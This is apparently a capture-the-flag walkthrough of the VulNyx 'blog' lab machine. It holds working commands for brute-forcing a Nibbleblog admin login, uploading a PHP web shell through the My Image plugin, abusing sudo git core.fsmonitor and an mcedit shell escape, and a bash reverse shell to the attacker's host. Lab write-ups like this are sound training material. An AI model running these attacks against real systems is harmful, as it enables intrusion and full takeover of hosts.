# blog

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| blog | d4t4s3c | easy | VulNyx |

**Summary:** Host discovery on the 192.168.56.0/24 segment isolated the Blog box at 192.168.56.135, and a full TCP scan exposed only SSH on port 22 and an Apache 2.4.38 web server on port 80. Content enumeration of the web root uncovered a `/my_weblog/` path whose README identified the application as Nibbleblog, a flat file blog engine. A Hydra brute force of the Nibbleblog admin form with the `admin` username and the rockyou wordlist recovered the password `kisses`, granting authenticated access to the admin dashboard. That access enabled abuse of the My Image plugin's authenticated file upload primitive: a PHP payload uploaded through the plugin was written verbatim to `content/private/plugins/my_image/image.php`, yielding command execution as the `www-data` user. Internal enumeration showed that `www-data` could run `/usr/bin/git` as the `admin` account without a password, so the `core.fsmonitor` git configuration option was hijacked to execute arbitrary commands inside a throwaway repository under `admin`'s context, revealing `/home/admin/user.txt`. The same primitive exposed that `admin` could run `/usr/bin/mcedit` as root without a password, so a stabilized reverse shell was launched as `admin` and `sudo /usr/bin/mcedit` was opened, after which the integrated User menu (F11) and the Invoke shell entry (s) dropped into an interactive root shell. From there the root flag was read from the disguised file `/root/r0000000000000000000000000t.txt`, while `/root/root.txt` proved to be an empty decoy.

---

## Reconnaissance

The engagement began by locating the target on the local VirtualBox segment and then progressively narrowing the exposed surface from the network layer down to the web application.

1. A ping sweep across the host only network identified the live candidates.

```bash
❯ nmap -sn 192.168.56.0/24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-23 20:29 +0700
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00024s latency).
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0020s latency).
Nmap scan report for 192.168.56.135 (192.168.56.135)
Host is up (0.0033s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.62 seconds
```

Three hosts responded on the 192.168.56.0/24 segment, and the candidate at 192.168.56.135 was selected as the Blog target.

2. A full TCP port scan then mapped the entire exposed surface of that host.

```bash
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-23 20:29 +0700
Nmap scan report for 192.168.56.135 (192.168.56.135)
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.67 seconds
```

Only two TCP ports survived the full range scan: 22 for SSH and 80 for HTTP.

3. Service and script detection fingerprinted the software behind those ports.

```bash
❯ nmap -p 22,80 -sCV -Pn -T4 --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-23 20:29 +0700
Nmap scan report for 192.168.56.135 (192.168.56.135)
Host is up (0.00022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 56:9b:dd:56:a5:c1:e3:52:a8:42:46:18:5e:0c:12:86 (RSA)
|   256 1b:d2:cc:59:21:50:1b:39:19:77:1d:28:c0:be:c6:82 (ECDSA)
|_  256 9c:e7:41:b6:ad:03:ed:f5:a1:4c:cc:0a:50:79:1c:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results to https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds
```

Version detection fingerprinted OpenSSH 7.9p1 on Debian and Apache httpd 2.4.38, confirming a Debian based Linux host and pointing the next phase at the web server.

4. Directory enumeration of the web root began with a medium wordlist.

```bash
❯ gobuster dir -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.135/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 271]
my_weblog            (Status: 301) [Size: 320] [--> http://192.168.56.135/my_weblog/]
server-status        (Status: 403) [Size: 279]
```

Browsing the web root returned only index.php and a redirect to /my_weblog/, while server-status was forbidden.

5. The discovered /my_weblog/ path was enumerated next.

```bash
❯ gobuster dir -u http://$ip/my_weblog/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.135/my_weblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
content             (Status: 301) [Size: 328] [--> http://192.168.56.135/my_weblog/content/]
index.php           (Status: 200) [Size: 4303]
themes              (Status: 301) [Size: 327] [--> http://192.168.56.135/my_weblog/themes/]
feed.php            (Status: 200) [Size: 993]
admin               (Status: 301) [Size: 326] [--> http://192.168.56.135/my_weblog/admin/]
admin.php           (Status: 200) [Size: 1395]
plugins             (Status: 301) [Size: 328] [--> http://192.168.56.135/my_weblog/plugins/]
README              (Status: 200) [Size: 902]
languages           (Status: 301) [Size: 330] [--> http://192.168.56.135/my_weblog/languages/]
LICENSE.txt         (Status: 200) [Size: 35148]
COPYRIGHT.txt       (Status: 200) [Size: 1271]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

The /my_weblog/ path exposed a classic flat file blog layout with content/, themes/, plugins/, languages/, admin/, admin.php, and feed.php, hinting at a self contained content management system.

6. The README and the admin page were retrieved to identify the software and its authentication form.

```bash
❯ curl -s http://$ip/my_weblog/README | head -16
====== Nibbleblog ======
Version: Beta on Github
Codename:
Release date:

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== About the author =====
Name: Diego Najar

❯ curl -s -c /tmp/nyx/nibble.cookie http://$ip/my_weblog/admin.php | grep -ioE '<form[^>]*>|<input[^>]*name=[^>]*>'
<form id="js_form" name="form" method="post"  ><div class="form_block" ><input class="username" name="username" type="text" placeholder="Username" autocomplete="off" maxlength="254" /></div><div class="form_block" ><input class="password" name="password" type="password" placeholder="Password" autocomplete="off" maxlength="254" /></div><div class="form_block" ><input type="checkbox" id="js_remember" name="remember" class="float"  value="1"/><label class="for_checkbox remember" for="js_remember" >Remember me</label><input type="submit" class="save" value="Login" /></div></form>
```

The README identified the software as Nibbleblog, and the admin.php page exposed a standard username and password form, setting up an authenticated attack path.

---

## Initial Access

### Nibbleblog Admin Credential Brute Force

7. With a single named account implied by the login form, Hydra was pointed at the admin endpoint with the rockyou wordlist.

```bash
❯ hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 192.168.56.135 http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password" -I
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-23 21:23:24
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://192.168.56.135:80/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password
[STATUS] 54.00 tries/min, 54 tries in 00:01h, 14344344 to do in 4427:17h, 16 active
[STATUS] 35.00 tries/min, 105 tries in 00:03h, 14344293 to do in 6830:37h, 16 active
[STATUS] 24.43 tries/min, 171 tries in 00:07h, 14344227 to do in 9786:31h, 16 active
[80][http-post-form] host: 192.168.56.135   login: admin   password: kisses
```

Hydra recovered admin:kisses against the Nibbleblog admin form, supplying the credentials needed for authenticated access.

### Authenticated File Upload to Remote Code Execution

8. The recovered credentials were posted to admin.php to establish a session.

```bash
❯ curl -s -b /tmp/nyx/nibble.cookie -c /tmp/nyx/nibble.cookie -X POST http://$ip/my_weblog/admin.php --data-urlencode "username=admin" --data-urlencode "password=kisses" -D - -o /dev/null
HTTP/1.1 302 Found
Date: Fri, 28 Aug 2026 00:10:36 GMT
Server: Apache/2.4.38 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /my_weblog/admin.php?controller=dashboard&action=view
Content-Length: 0
Content-Type: text/html; charset=UTF-8

#HttpOnly_192.168.56.135	FALSE	/my_weblog	FALSE	0	PHPSESSID	8lh7rko2coum6jmkiahdbqqm8j
```

Posting the recovered credentials returned a 302 redirect to the dashboard controller and a PHPSESSID cookie, confirming a valid admin session.

9. The plugin configuration page for My Image was inspected to understand its upload form.

```bash
❯ curl -s -b /tmp/nyx/nibble.cookie "http://$ip/my_weblog/admin.php?controller=plugins&action=config&plugin=my_image" | grep -oE '<form[^>]*>|<input[^>]*>|<select[^>]*>'
<form id="js_form" name="form" method="post" enctype="multipart/form-data" class="plugins"  >
<input name="plugin" type="hidden" value="my_image" />
<input name="title" type="text" value="My image" />
<select name="position" >
<input name="caption" type="text" value="">
<input name="image" type="file">
<input name="image_resize" type="hidden" value="1">
<input name="image_width" type="hidden" value="230">
<input name="image_height" type="hidden" value="200">
<input name="image_option" type="hidden" value="auto">
<input class="save" type="submit" value="Save changes" />
```

The My Image plugin configuration exposed a multipart upload form with an image file input and no meaningful client side restrictions, a known Nibbleblog authenticated file upload primitive.

10. A PHP payload was crafted, uploaded through the plugin, located on disk, and exercised for command execution.

```bash
❯ printf '<?php echo "PWNED_TEST"; system($_GET["c"]); ?>' > /tmp/nyx/shell.php
❯ curl -s -b /tmp/nyx/nibble.cookie -X POST "http://$ip/my_weblog/admin.php?controller=plugins&action=config&plugin=my_image" -F "plugin=my_image" -F "title=My image" -F "position=0" -F "caption=" -F "image=@/tmp/nyx/shell.php;type=image/jpeg" -F "image_resize=1" -F "image_width=230" -F "image_height=200" -F "image_option=auto" -D - -o /dev/null
HTTP/1.1 200 OK
Date: Fri, 28 Aug 2026 00:11:00 GMT
Server: Apache/2.4.38 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 5477
Content-Type: text/html; charset=UTF-8

❯ for p in content/private/plugins/my_image/image.php content/public/plugins/my_image/image.php; do curl -s -o /dev/null -w "$p -> HTTP %{http_code} size=%{size_download}\n" http://$ip/my_weblog/$p; done
content/private/plugins/my_image/image.php -> HTTP 200 size=10
content/public/plugins/my_image/image.php -> HTTP 404 size=276

❯ SH="http://$ip/my_weblog/content/private/plugins/my_image/image.php"; curl -s -G "$SH" --data-urlencode "c=id; whoami; hostname; uname -a"
PWNED_TESTuid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
blog
Linux blog 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
```

The PHP payload was uploaded through the plugin and written verbatim to content/private/plugins/my_image/image.php, and the c parameter immediately returned command execution as www-data on the host blog.

---

## Lateral Movement

### git core.fsmonitor Execution as admin

11. The web shell was used to enumerate the local user landscape and the sudo grants available to www-data.

```bash
❯ curl -s -G "$SH" --data-urlencode "c=ls -la /home/; echo ---SUDO---; sudo -l 2>&1; echo ---TOOLS---; which sudo nc python perl"
total 12
drwxr-xr-x  3 root  root  4096 Feb 15  2022 .
drwxr-xr-x 18 root  root  4096 Sep 28  2021 ..
drwx------  3 admin admin 4096 Apr 24  2023 admin
---SUDO---
sudo: unable to resolve host blog: Temporary failure in name resolution
Matching Defaults entries for www-data on blog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User www-data may run the following commands on blog:
    (admin) NOPASSWD: /usr/bin/git
---TOOLS---
/usr/bin/sudo
/usr/bin/nc
/usr/bin/python
/usr/bin/perl
```

www-data could run /usr/bin/git as admin without a password, a narrow but exploitable sudo grant, while the admin home directory was locked behind drwx------ permissions.

12. The core.fsmonitor option was abused to execute commands inside admin's context from a throwaway repository.

```bash
❯ curl -s -G "$SH" --data-urlencode "c=rm -rf /tmp/gt; git init /tmp/gt >/dev/null 2>&1; cd /tmp/gt; echo hi > f; git add f 2>/dev/null; rm -f /tmp/admin.out; sudo -u admin /usr/bin/git -C /tmp/gt -c core.fsmonitor='id > /tmp/admin.out 2>&1; echo f' status >/dev/null 2>&1; cat /tmp/admin.out"
uid=1000(admin) gid=1000(admin) groups=1000(admin)

❯ curl -s -G "$SH" --data-urlencode "c=rm -f /tmp/admin.out; sudo -u admin /usr/bin/git -C /tmp/gt -c core.fsmonitor='ls -la /home/admin/ > /tmp/admin.out 2>&1; echo f' status >/dev/null 2>&1; cat /tmp/admin.out"
total 28
drwx------ 3 admin admin 4096 Apr 24  2023 .
drwxr-xr-x  3 root  root 4096 Feb 15  2022 ..
lrwxrwxrwx 1 root  root    9 Feb 15  2022 .bash_history -> /dev/null
-rw------- 1 admin admin  220 Apr 18  2019 .bash_logout
-rw------- 1 admin admin 3526 Apr 18  2019 .bashrc
drwx------ 3 admin admin 4096 Feb 15  2022 .local
-rwx------ 1 admin admin  807 Apr 18  2019 .profile
-r-------- 1 admin admin   33 Apr 24  2023 user.txt

❯ curl -s -G "$SH" --data-urlencode "c=rm -f /tmp/admin.out; sudo -u admin /usr/bin/git -C /tmp/gt -c core.fsmonitor='cat /home/admin/user.txt > /tmp/admin.out 2>&1; echo f' status >/dev/null 2>&1; cat /tmp/admin.out"
1385bbd4fcdb68d2cc5d5204f97d4a80
```

By setting core.fsmonitor to a shell command inside a throwaway repository, git executed that command as admin, exposing the admin home directory and the user flag in /home/admin/user.txt.

13. The same primitive was reused to enumerate admin's own sudo grants.

```bash
❯ curl -s -G "$SH" --data-urlencode "c=rm -f /tmp/admin.out; sudo -u admin /usr/bin/git -C /tmp/gt -c core.fsmonitor='sudo -l > /tmp/admin.out 2>&1; echo f' status >/dev/null 2>&1; cat /tmp/admin.out"
sudo: unable to resolve host blog: Temporary failure in name resolution
Matching Defaults entries for admin on blog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User admin may run the following commands on blog:
    (root) NOPASSWD: /usr/bin/mcedit
```

Repeating the enumeration as admin revealed that admin could run /usr/bin/mcedit as root without a password, opening the path to full privilege escalation.

---

## Privilege Escalation

### mcedit User Menu Shell Escape

14. A bash reverse shell was staged on the target and launched through the fsmonitor primitive as admin, then caught and stabilized.

```bash
❯ printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.56.1/4450 0>&1\n' > /tmp/nyx/rs.sh
❯ B64=$(base64 -w0 /tmp/nyx/rs.sh); curl -s -G "$SH" --data-urlencode "c=echo $B64 | base64 -d > /tmp/rs.sh; chmod +x /tmp/rs.sh"
❯ curl -s -G "$SH" --data-urlencode "c=rm -f /tmp/admin.out; sudo -u admin /usr/bin/git -C /tmp/gt -c core.fsmonitor='bash /tmp/rs.sh' status > /dev/null 2>&1 &" -o /dev/null

❯ nc -lvnp 4450
listening on [any] 4450 ...
connect to [192.168.56.1] from (192.168.56.135) 44330
bash: cannot set terminal process group (430): Inappropriate ioctl for device
bash: no job control in this shell
admin@blog:/tmp/gt$ python -c 'import pty,os; pty.spawn("/bin/bash")'
admin@blog:/tmp/gt$ export TERM=xterm
admin@blog:/tmp/gt$ export SHELL=/bin/bash
admin@blog:/tmp/gt$ stty rows 50 cols 200
admin@blog:/tmp/gt$ sudo /usr/bin/mcedit
sudo: unable to resolve host blog: Temporary failure in name resolution
```

The stabilized admin shell was used to open mcedit with root privileges through sudo, producing an editor running in the root security context.

15. With mcedit running as root, the User menu was opened with F11 and the Invoke shell entry was selected with s, dropping into an interactive root shell from which both flags were recovered.

```bash
# id; whoami; hostname; uname -a
uid=0(root) gid=0(root) groups=0(root)
root
blog
Linux blog 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
# ls -la /root/
total 40
drwx------  5 root root 4096 Aug 28 02:24 .
drwxr-xr-x 18 root root 4096 Sep 28  2021 ..
lrwxrwxrwx  1 root root    9 Sep 29  2021 .bash_history -> /dev/null
-rw-------  1 root root 3526 Feb  1  2022 .bashrc
drwx------  3 root root 4096 Feb 15  2022 .cache
drwx------  3 root root 4096 Feb 15  2022 .config
drwx------  3 root root 4096 Sep 28  2021 .local
-rw-------  1 root root  148 Aug 17  2015 .profile
-rwx------  1 root root   66 Sep 28  2021 .selected_editor
-rwx------  1 root root  118 Feb 15  2022 .services.sh
-r--------  1 root root   33 Apr 24  2023 r0000000000000000000000000t.txt
-rw-r--r--  1 root root    0 Aug 28 02:24 root.txt
# cat /root/root.txt
# cat /root/r0*t.txt
6c24e7883470e2c1683df7672576a1f7
# cat /home/admin/user.txt /root/r0*t.txt
138...
6c2...
```

The mcedit User menu shell escape yielded a root shell, and the root flag was read from the disguised file /root/r0000000000000000000000000t.txt while /root/root.txt returned empty as a decoy. The final cat of both flag files confirmed the user value 138... and the root value 6c2....

---

## Attack Chain Summary

1. **Reconnaissance**: Nmap isolated the Blog host and enumerated SSH and HTTP, then gobuster uncovered the Nibbleblog installation at /my_weblog/.
2. **Vulnerability Discovery**: Hydra cracked the admin credentials, and the My Image plugin upload plus two sudo grants (git as admin, mcedit as root) were identified as the abuse primitives.
3. **Exploitation**: An authenticated PHP payload was uploaded through the My Image plugin to gain www-data code execution, then git core.fsmonitor pivoted to admin and the mcedit User menu shell escape reached root.
4. **Internal Enumeration**: sudo listings exposed the git and mcedit grants, and the admin home directory revealed the user flag while the root home exposed a disguised flag file beside an empty decoy.
5. **Privilege Escalation**: A reverse shell was caught and stabilized as admin, sudo mcedit was opened, and the F11 Invoke shell escape yielded a root shell that read both flags.
